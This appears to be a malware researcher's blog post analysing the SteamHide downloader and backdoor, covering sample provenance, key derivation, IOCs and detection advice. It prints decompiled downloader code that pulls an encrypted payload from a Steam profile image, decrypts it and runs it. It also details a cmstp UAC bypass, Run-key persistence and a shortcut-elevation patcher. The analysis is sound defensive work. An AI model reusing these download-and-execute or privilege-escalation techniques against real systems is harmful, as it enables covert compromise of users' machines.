---
title: "SteamHide's newer samples are the old ones after a pass through LIEF"
date: 2026-11-18T20:30:02+00:00
slug: "steamhide-lief-copies"
description: "The four SteamHide hashes G Data published in 2021 are two builds, not four: the 'newer' pair is the first pair with its resources rebuilt by LIEF, and both downloaders read the same Steam profile. That profile and the Pastebin config are still online. Steam's new image host now makes the downloader's regex return an empty URL, and the paste holds a LAN address. The key derivation, what the backdoor really runs, what it never calls, and a decryptor."
tags: ["steamhide", "steganography", "dotnet", "steam", "uac-bypass", "lief"]
sample:
  family: "SteamHide"
  sha256: "148914b6c64c51130a42159e4100e6eb670852901418d88c1c0383bf0cd1e339"
  source: "[MalwareBazaar](https://bazaar.abuse.ch/sample/148914b6c64c51130a42159e4100e6eb670852901418d88c1c0383bf0cd1e339/)"
toc: true
---

G Data's SteamHide report lists four SHA-256 hashes: two downloaders that pull an encrypted executable out of an image on a Steam profile, and two copies of the backdoor they deliver. It calls the second pair "newer samples" whose downloader "uses a different Steam profile". The files are newer, but the builds aren't, and the profile is the same. Each file in the second pair has the same code bytes and PE timestamp as its counterpart in the first pair, and both downloaders read the same Steam profile. The files differ only in layout: a 4th section named `.l2`, which is the name [LIEF](https://github.com/lief-project/LIEF)'s PE builder gives a resource table it rebuilds. Five years on, the profile and the Pastebin paste the backdoor is configured with are both still online. The paste holds `hxxp://192.168.0[.]24/upload.php`, a private LAN address.

Karsten Hahn of G Data published [Picture this: Malware Hides in Steam Profile Images](https://blog.gdatasoftware.com/2021/06/36861-malware-hides-in-steam-profile-images) on 2021-06-08, after a tweet by @miltinhoc in May 2021. SteamHide is an assignment in his course Windows Malware Analysis for Hedgehogs, which is where TheAbsnt's two-part write-up from 2024 came from ([part I](https://theabsnt.github.io/malware-analysis/steamhide-analysis/part01), [part II](https://theabsnt.github.io/malware-analysis/steamhide-analysis/part02)). Those posts already cover the main flow: the VM check, the first-run marker file, the cmstp escalation, the `BroMal` Run key and the unused classes. I don't repeat that walk-through here. This post covers what's still open: where the second pair came from, the exact key derivation, what happens when the downloader runs today, and what the dormant code would have done. The first pair is on MalwareBazaar ([downloader](https://bazaar.abuse.ch/sample/148914b6c64c51130a42159e4100e6eb670852901418d88c1c0383bf0cd1e339/), [backdoor](https://bazaar.abuse.ch/sample/b41868a6a32a7e1167f4e76e2f3cf565b6c0875924f9d809d889eae9cb56a6ae/)). The second pair is only on Hybrid Analysis ([downloader](https://www.hybrid-analysis.com/sample/368c97aef6c41b83d06c0ebb1f52679ff96a9aea35499a1caa8c3115cd16880b), [backdoor](https://www.hybrid-analysis.com/sample/194c18dc8bc923887ff6b6f2acacd00b54890ca1c52233581c7802fd176dc056)).

## What I found

- The four hashes are two builds. `368c97ae` is `148914b6`, and `194c18dc` is `b41868a6`, each with its resources copied into a new `.l2` section (characteristics `0x40000040`), the headers grown from 0x200 to 0x400 bytes, and a debug-directory file pointer left 0x200 bytes short. `.text`, `.rsrc` and `.reloc` match byte for byte, and both downloaders read `steamcommunity[.]com/id/advance40/images`.
- The payload key is `SHA-512` iterated 192 times over the password and a 16-byte salt (`PasswordDeriveBytes`). The first 24 bytes of the result are the 3DES key and the next 8 are the IV. The password has single backslashes. G Data printed it with doubled ones, and the 32-character string that gives derives a different key.
- The profile still exists and has three artworks from 2015 to 2017. Once the 2021 images were gone, the image the downloader picked was most likely the 2017 JPEG, whose real color profile decrypts to 3,040 bytes of junk that it would run as `steam.exe`. That fits the invalid executable TheAbsnt got in 2024. Since Steam moved its images to `images.steamusercontent[.]com`, the regex's optional group matches an empty URL, and `WebClient.DownloadData("")` throws before anything is written.
- On a first run without an elevated token, the backdoor tries the cmstp INF trick to start an elevated copy of itself. For an administrator account running unelevated, that gives a second copy. The two copies write `BroMal` under both HKCU and HKLM, and neither takes the mutex, because `CheckMutexRunning` has no caller. Neither does anything after that: the 60-second timer is never started and its handler is empty.
- The dormant code goes further than the reports say. A shortcut patcher sets the "Run as administrator" bit in `.lnk` files. The Squirrel check collects Squirrel-installed apps one folder below `%LOCALAPPDATA%` and skips the folder G Data named. The compiler hook expects a class called `About.Decode`.

## Two hashes, one build

I began by taking G Data's sentence at face value. It says the newer downloader "uses a different Steam profile but the very same technique", so I expected one changed string in `368c97ae`. Decompiling both downloaders gave identical projects. So did both backdoors:

```console
$ diff -r src/148914b6 src/368c97ae
Only in 148914b6: 148914b6c64c...e339.csproj
Only in 368c97ae: 368c97aef6c4...880b.csproj
$ diff -r src/b41868a6 src/194c18dc
Only in 194c18dc: 194c18dc8bc9...c056.csproj
Only in b41868a6: b41868a6a32a...a6ae.csproj
```

The only differences are the project files, which are named after the input hash. A decompiler could still hide a string difference, so I compared the sections by bytes:

| | 148914b6 (Bazaar) | 368c97ae (HA) |
|---|---|---|
| size | 16,896 | 19,456 |
| TimeDateStamp | 0x609DCE98 (2021-05-14 01:12:56 UTC) | 0x609DCE98 |
| SizeOfHeaders | 0x200 | 0x400 |
| `.text` / `.rsrc` / `.reloc` | reference | 0 bytes differ |
| extra section | none | `.l2`, RVA 0xA000, 0x800 bytes, `0x40000040` |
| resource directory | 0x6000, 0x62C | 0xA000, 0x800 |
| debug entry file pointer | 0x3550 (points at `RSDS`) | 0x3550 (now unrelated metadata; `RSDS` moved to 0x3750) |

The backdoor pair has the same layout: 23,552 against 25,600 bytes, `.text` identical, `.l2` at 0xC000. Every section moved 0x200 bytes down the file because the header needed room for a 4th section entry. Nothing updated the debug directory, so its `PointerToRawData` still holds the old offset. That is why the second pair shows no PDB path in tools that follow the pointer.

The section name identifies the tool. LIEF's PE builder names a section it adds after the data directory it holds. From [`src/PE/Builder.cpp`](https://github.com/lief-project/LIEF/blob/0.11.5/src/PE/Builder.cpp) at 0.11.5:

```cpp
Section new_section_rsrc{".l" + std::to_string(static_cast<uint32_t>(DATA_DIRECTORY::RESOURCE_TABLE))};
new_section_rsrc.characteristics(0x40000040);
```

`RESOURCE_TABLE` is directory 2, so the section is `.l2` with `0x40000040`, which is what both files carry. Both the name and the flags are what LIEF writes, so I'm confident someone opened `148914b6` and `b41868a6` in LIEF and wrote them back with resource rebuilding on. Hybrid Analysis lists both with a submission date of 2021-05-26 under the name `file`, 12 days after the originals reached MalwareBazaar. I can't tell who rebuilt them or why (an analysis pipeline, a detection test, an AV-evasion check). They aren't a later campaign, and they don't name a second profile.

The timestamps give a short timeline for the first pair. The downloader was compiled at 01:12:56 UTC on 2021-05-14, and MalwareBazaar first saw it eight hours later (09:10:53, reporter `GEI_MC`). The backdoor's `0xEDB4955B` decodes to the year 2096, but its debug directory has a type-16 (`REPRO`) entry. That makes the timestamp a deterministic build hash, not a date. MalwareBazaar tags both files `RedLineStealer`, which they are not.

## The downloader reads one image property and decrypts it

The downloader is a 16,896-byte Visual Basic .NET form that hides itself and does everything in `Form1_Load`. Trimmed:

```csharp
// (1)
string pattern = "<img style=\"width: 100%;\" src=\"(https://steamuserimages-a.akamaihd.net/ugc/\\d+/.*?/)?";
webClient2.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0");
input = webClient2.DownloadString("https://steamcommunity.com/id/advance40/images");
Match match = Regex.Match(input, pattern);
if (match.Success) {
    text = match.Groups[1].Value;                                   // (2)
    webClient.Headers.Add("user-agent", "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.53 Safari/525.19");
    byte[] array = webClient.DownloadData(text);
    Image val = Image.FromStream(new MemoryStream(array));
    byte[] value = val.GetPropertyItem(34675).Value;                // (3)
    byte[] bytes = DecryptBytes(value, "{PjlD\\bzxS#;8@\\x.3JT&<4^MsTqE0", 192);
    File.WriteAllBytes("steam.exe", bytes);                         // (4)
    Process.Start("steam.exe");
}
```

At (1), the pattern looks for the first full-width image on the profile's images page. The `?` after the group makes the URL optional, which matters later. (2) takes the URL from that group, and the image is fetched with a different User-Agent from the page: a Chrome 1.0 build on Windows XP. Both `WebClient`s set `Proxy = null`, so they ignore the system proxy settings. On a network that only allows traffic through an explicit proxy, the downloader can't reach Steam at all. (3) reads GDI+ property 34675 (0x8773), `PropertyTagICCProfile`, the image's embedded color profile. (4) writes the decrypted bytes to `steam.exe` in the current directory and starts it.

`CryptBytes` is a standard .NET pattern:

```csharp
PasswordDeriveBytes pdb = new PasswordDeriveBytes(password, SALT, "SHA512", iterations);
tripleDES.Key = pdb.GetBytes(24);
tripleDES.IV  = pdb.GetBytes(8);
```

`PasswordDeriveBytes` is Microsoft's extension of PBKDF1. For a request that fits in one hash output, it reduces to:

```text
h = SHA512(password_utf8 || salt)
repeat 190 times: h = SHA512(h)           ; iterations - 2
block = SHA512(h)
key = block[0:24]   iv = block[24:32]     ; 3DES-CBC, PKCS#7
salt = 22 41 0B 0C 10 00 41 80 5C 48 41 17 57 0B 0A 08
```

The second `GetBytes(8)` reads the 8 bytes that follow the key in the same SHA-512 block. It doesn't start a new block, because 24 + 8 fit within the 64-byte output. I checked my Python version against .NET's own class instead of trusting the reduction. .NET 8 derived key `5AD3B743A474B24211B3809D07D6B517365F6161BF8A975B` and IV `5F49826133F6F7A2`, and Python produced the same pair. I encrypted the backdoor with .NET's `TripleDES` and decrypted it with Python, and got `b41868a6...a6ae` back byte for byte.

The password in the `#US` heap is 30 characters with two single backslashes: `7b506a6c445c627a...` (`{PjlD\bzxS#;8@\x.3JT&<4^MsTqE0`). G Data's report prints it as it appears in C# source, `"{PjlD\\bzxS#;8@\\x.3JT&<4^MsTqE0"`. Copied literally, that 32-character string derives `D072C61A...`, which is the wrong key. TheAbsnt's part I has the right password but describes the hash as SHA256. The code passes `"SHA512"`.

The 3DES ciphertext of the 23,552-byte backdoor is 23,560 bytes, small enough for one JPEG APP2 segment. It doesn't start with an ICC header, so the 4 bytes where a parser expects the profile size are ciphertext. G Data noted that EXIF tools warn that the ICC profile length is not valid, which fits.

## Steam moved its images, and the regex still matches

The profile `advance40` still resolves. On 2026-11-18 its images URL showed the profile's Artwork tab with three items posted on 23 Dec 2015, 26 Jun 2016 and 7 Mar 2017. None was posted in 2021, so the images G Data photographed are gone. The two GIFs have no color profile, and the JPEG carries a normal 3,048-byte ICC profile (`acsp` signature, display class), which does not decrypt under the key.

I expected the downloader's regex to fail on today's page, since Steam no longer uses `steamuserimages-a.akamaihd[.]net` and serves images from `images.steamusercontent[.]com`. It doesn't fail. I fetched the page with the downloader's User-Agent and ran the exact pattern through .NET's `Regex`:

```console
$ dotnet dncheck.dll regex steam_profile_ua.html
success=True group1=[] group1.Success=False index=37129
DownloadData: System.ArgumentException: The value cannot be an empty string. (Parameter 'path')
```

`<img style="width: 100%;" src="` still appears on the page, and the optional group matches nothing, so `match.Success` is true and `Groups[1].Value` is an empty string. `WebClient` turns a path it can't parse as a URI into a local file path, and an empty path throws before any network call. The downloader never reaches `File.WriteAllBytes`. My check used .NET 8. The downloader targets .NET Framework 4.5, whose `WebClient` takes the same path for a non-absolute URI, but I did not test it on Framework.

That explains today. It doesn't explain 2024, and I first got this wrong. TheAbsnt wrote in part I that the page "does not return the intended image url, which is why the steam.exe turn out to be invalid executable". I read that as the same empty-URL failure. It can't be, because an empty URL throws before anything is written, and TheAbsnt got a file. Today's page has exactly one full-width image, the 2017 JPEG, the newest item that is left. While Steam still served it from the akamaihd host, the regex would have captured its URL. Its real ICC profile doesn't decrypt. The padding check throws, `CryptBytes` catches and ignores the exception, and the memory stream keeps what was decrypted before the last block. Running that through .NET's own classes gives:

```console
$ dotnet dncheck.dll decswallow jpeg2017_icc.bin
swallowed System.Security.Cryptography.CryptographicException
in=3048 out=3040 mz=False
```

That's 3,040 bytes of noise, written as `steam.exe` and started, which matches "invalid executable". So the downloader died when the 2021 images were removed, and the host change only moved the failure earlier. I can't date the host change from what I have.

The [stegowiper](https://github.com/mindcrypt/stegowiper) dataset and TheAbsnt's part I already listed the profile URL publicly.

## What the backdoor runs on a first launch

`FinalMalware.exe` is a 23,552-byte C# form. All of its live behavior is in `Form1_Load`:

```csharp
if (!Evasion.IsInsideVM()) {                     // "VBOX"/"VMware" in Win32_DiskDrive
    // (1)
    if (Admin.Check() || !Evasion.CheckFirstRun() || TryPrivilegeEscalation()) { }
    AddPersistence();                                // (2)
    PopulateSearchPaths();
    PopulateShortcuts();                             // (3)
    Apps.EnumerateVulnerable(Apps.APPS_PATH, SearchOption.AllDirectories);
} else {
    Application.Exit();
}
```

The `if` at (1) has an empty body and exists for its short-circuit order. An administrator stops at `Admin.Check()`. Anyone else, including an administrator account running with a filtered token, reaches `CheckFirstRun()`, which creates the empty marker `%LOCALAPPDATA%\uNoFGmsEX\uNoFGmsEX..txt` (the config's extension already starts with a dot, and the code adds another) and returns true the first time. Only then does `TryPrivilegeEscalation()` run. On every later launch, the marker short-circuits the escalation. G Data wrote that the backdoor "copies itself to the LOCALAPPDATA folder". It doesn't: `File.Create` makes the empty marker and nothing copies the executable. TheAbsnt's part II already describes the marker.

The escalation is the public cmstp UAC bypass. The same INF text, `REPLACE_COMMAND_LINE` placeholder and window-polling loop are in several GitHub projects, for example [NYAN-x-CAT/UAC-Escaper](https://github.com/NYAN-x-CAT/UAC-Escaper). SteamHide's copy has small changes (service name `broVPN`, `SendKeys.Send` in place of `SendWait`, a Temp path built from the Windows folder in place of a hard-coded `C:\windows\temp`). It writes the INF to `%WINDIR%\Temp\<random>.inf` and never deletes it, and runs `cmstp.exe /au <inf>`. It then spins on `Process.GetProcessesByName("cmstp")` until a window handle appears and sends Enter. There is no timeout. If cmstp exits or is blocked before showing a window, the loop runs forever on the UI thread.

The bypass only works for an account in the Administrators group running unelevated. A true standard user gets no silent elevation. If it works, the INF's `RunPreSetupCommands` start a second, elevated `FinalMalware` from the same path. Both copies reach (2). `AddToWindowsBoot` writes HKLM when it runs as administrator and HKCU otherwise. Each copy adds the value `BroMal` = its own path under `Software\Microsoft\Windows\CurrentVersion\Run`, unless the value is already there. So a successful first run leaves two Run entries and two running processes. There is no mutex. `CheckMutexRunning` would create one named `Global\` plus the GUID of the form's type, but the method has no caller in the IL. G Data lists the mutex among the behaviors. TheAbsnt correctly lists it among the unused code.

After (3) the form is hidden and the message loop runs. `GetDataTimer` has a 60-second interval, but nothing sets `Enabled` or calls `Start()`, and its `Tick` handler is empty. The process then sits idle until logoff.

## What it carries and never calls

I checked every method below for call sites in the IL (`ilspycmd -il`, all 17 types listed) and every config field for loads. None has a caller in either build.

| member | what it would do | note |
|---|---|---|
| `Updater.GetNewVersion(profileId)` | fetch `steamcommunity[.]com/id/<id>/images/`, same regex, decrypt property 34675, write `steam.exe` | never starts the file it writes; `DROPPED_FILENAME = "final.exe"` is never read either |
| config field `CC` | `hxxps://pastebin[.]com/raw/xLTeenQV` | never loaded; see below |
| `CreateTwitterRequest(...)` | builds a GET `Request` with web-client headers (`x-guest-token`, `x-csrf-token`) and stores it under `"twitter"` | no URL, never sent |
| `CodePiece.GenerateCode` / `RunCode` | compile C# in memory with `CSharpCodeProvider`, then call `About.Decode.Main(string)` | the class name suggests decoders delivered as source |
| `ShortcutUtils.ChangeRunMode(path)` | write `0x20` at offset 21 of a `.lnk` file | sets "Run as administrator", see below |
| `Evasion.ChangeHash` | empty | |
| `Apps.FilterApps` | empty | |
| `CheckMutexRunning` | `Global\{GUID}` mutex | |

The Pastebin paste was created on 13 May 2021 at 17:26:38 CDT (22:26:38 UTC), less than three hours before the downloader's compile time, and last edited on 16 May. On 2026-11-18 it returned 30 bytes:

```text
http://192.168.0.24/upload.php
```

That's an RFC 1918 address, meaningful only on whichever LAN it was set up for, and the path names an upload endpoint. G Data describes the paste as holding the "initial command-and-control server IP". I can't know what it held between 13 and 16 May. What it holds now can't reach anything over the internet, and no code in either build reads it. Together with the stubs in the table, I think this was a project still in development, not a running operation. G Data's own update says the method "appears to be under development" and "has not yet seen active use on a broader scale".

`ChangeRunMode` is the part neither report mentions. The `ShellLinkHeader` is a 4-byte size, a 16-byte CLSID, then the 4-byte `LinkFlags` at offset 20. Byte 21 holds bits 8–15, so `0x20` there is bit 13, `SLDF_RUNAS_USER = 0x00002000`, the "Run as administrator" checkbox. The code writes the whole byte, so it also clears whatever else was set in bits 8–15 (`SLDF_HAS_EXP_SZ`, `SLDF_RUN_IN_SEPARATE`, `SLDF_HAS_DARWINID` among them). `EnumerateShortcuts` already collects every `*.lnk` under Desktop and Documents, recursively. I think the plan was to make the user's own shortcuts ask for elevation, so that a UAC prompt from a familiar icon would look normal. Nothing calls it, so that's inference from two pieces that were never connected.

The Squirrel check doesn't look for Teams specifically. `EnumerateVulnerable` checks `%LOCALAPPDATA%` and the folders directly below it, and records each one that contains `SquirrelSetup.log`. Apps installed deeper are missed. Classic Teams installs under `%LOCALAPPDATA%\Microsoft\Teams`, so as far as I know this check would miss Teams too. It skips any path containing `SquirrelTemp`, the folder G Data named. The result is a dictionary of Squirrel-installed apps, keyed by install path, which `FilterApps` (empty) would presumably have narrowed down.

## The extractor

[families/steamhide](https://github.com/stateless-re/tools/tree/main/families/steamhide) in the tools repo does both sides. Given a downloader or backdoor, it reads the password, the salt (from the `FieldRVA` initializer), the profile URL, the regex and the Pastebin URLs. Given an image, it takes the ICC data from JPEG APP2 `ICC_PROFILE` segments, EXIF tag 0x8773, PNG `iCCP` or a bare blob (`--raw`), decrypts it, and writes the payload only with `-o`:

Abridged:

```console
$ python extract.py synthetic_app2.jpg
{"kind": "image", "icc_source": "jpeg-app2-icc", "icc_size": 23560, "icc_looks_genuine": false, "decrypted_size": 23552, "decrypted_sha256": "b41868a6a32a7e1167f4e76e2f3cf565b6c0875924f9d809d889eae9cb56a6ae", "decrypted_is_pe": true}
```

None of the 2021 carrier images is public. TheAbsnt's part I lists one, `blink.jpg` (`c0b7af1d...86cb`), which is on neither MalwareBazaar nor Hybrid Analysis. So I tested the tool on carriers I built from .NET-encrypted ciphertext, and on Steam's remaining JPEG, which it correctly reports as a genuine ICC profile that doesn't decrypt.

## What I couldn't determine

The 2021 images are gone from the profile, and no archive captured the images page, so I couldn't test the extractor on a real carrier or see whether the operators ever posted a second payload. Who ran the samples through LIEF is unknown. The paste's content between its creation and its last edit is unknown. The Twitter request has headers and no endpoint, so its purpose is a guess either way.

## Indicators

| SHA-256 | role |
|---|---|
| 148914b6c64c51130a42159e4100e6eb670852901418d88c1c0383bf0cd1e339 | downloader, `Hide binary inside image.exe` |
| 368c97aef6c41b83d06c0ebb1f52679ff96a9aea35499a1caa8c3115cd16880b | same downloader after a LIEF resource rebuild |
| b41868a6a32a7e1167f4e76e2f3cf565b6c0875924f9d809d889eae9cb56a6ae | backdoor, `FinalMalware.exe` (written as `steam.exe`) |
| 194c18dc8bc923887ff6b6f2acacd00b54890ca1c52233581c7802fd176dc056 | same backdoor after a LIEF resource rebuild |

Network:

- `hxxps://steamcommunity[.]com/id/advance40/images` (profile page; still online, 2021 images removed)
- `hxxps://steamuserimages-a.akamaihd[.]net/ugc/<id>/<hash>/` (image URL shape the regex expects)
- `hxxps://pastebin[.]com/raw/xLTeenQV` (configured, never read; holds `hxxp://192.168.0[.]24/upload.php`)
- User-Agents, profile page first, then image:

```text
Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19
  (KHTML, like Gecko) Chrome/1.0.154.53 Safari/525.19
```

The second string is one line; it's wrapped here.

Host:

- `steam.exe` written to the downloader's working directory
- `%LOCALAPPDATA%\uNoFGmsEX\uNoFGmsEX..txt` (empty marker)
- `HKCU` and `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\BroMal`
- `%WINDIR%\Temp\<random>.inf` containing `ServiceName="broVPN"`, followed by `cmstp.exe /au`

## ATT&CK

| ID | technique | here |
|---|---|---|
| T1027.003 | Steganography | payload in the image's ICC profile property (0x8773) |
| T1102 | Web Service | Steam profile as payload host |
| T1105 | Ingress Tool Transfer | downloader fetches and writes `steam.exe` |
| T1140 | Deobfuscate/Decode Files | 3DES with a `PasswordDeriveBytes` key |
| T1497.001 | System Checks | `Win32_DiskDrive` caption contains VBOX or VMware |
| T1548.002 | Bypass User Account Control | cmstp INF with `/au` |
| T1218.003 | CMSTP | the same INF runs the backdoor through cmstp |
| T1547.001 | Registry Run Keys | `BroMal` under HKCU and HKLM |
| T1083 | File and Directory Discovery | `.lnk` files and Squirrel app folders collected |

SteamHide's distinctive idea, a payload in a Steam profile image that the operator can swap without touching the downloader, also meant the downloader worked only while that image was there. Once the images were deleted it ran junk, and since Steam's host change it runs nothing. The network side was always weak, since everything goes over HTTPS to Steam and the image is decoded in memory. The host side is not: a `steam.exe` in some random working directory, a `BroMal` Run value, and `cmstp.exe /au` reading an INF from `%WINDIR%\Temp` are each worth an alert on their own.

## Credits

Karsten Hahn (G Data) for the [original report](https://blog.gdatasoftware.com/2021/06/36861-malware-hides-in-steam-profile-images), and @miltinhoc for the first tweets. TheAbsnt for the 2024 two-part analysis, which has the right password and the right first-run behavior. `GEI_MC` for uploading the first pair to MalwareBazaar. The [LIEF](https://github.com/lief-project/LIEF) builder source made the `.l2` section easy to recognize.
